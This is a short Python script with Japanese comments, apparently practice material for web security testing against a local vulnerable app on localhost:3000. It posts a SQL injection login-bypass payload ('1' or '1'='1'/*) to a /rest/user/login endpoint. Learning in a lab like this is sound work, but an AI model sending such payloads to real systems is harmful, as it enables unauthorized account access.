# モジュールの読み込みqqqqq
from bs4.element import Script
import requests
# import json
from bs4 import BeautifulSoup

# proxy
http_proxy  = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"
ftp_proxy   = "ftp://127.0.0.1:8080"

proxyDict = { 
              "http"  : http_proxy, 
              "https" : https_proxy, 
              "ftp"   : ftp_proxy
            }

# 対象serverのURL
server = 'http://localhost:3000/'

# requestのpayload例
# SQLインジェクション例
email = '1\' or \'1\' = \'1\'/*'
password = '1'
payload = {'email': email, 'password': password}

# HTMLを取得例
def get_html(server):
      r = requests.get(server)
      parsed_r = BeautifulSoup(r.content,"html.parser")
      return print(parsed_r)

# jsonのrequestを送信する例
# インジェクション例
def login(server,payload):
      r = requests.post(server+'/rest/user/login',json=payload)
      print(r.content)

# 実行
get_html(server)
login(server,payload)
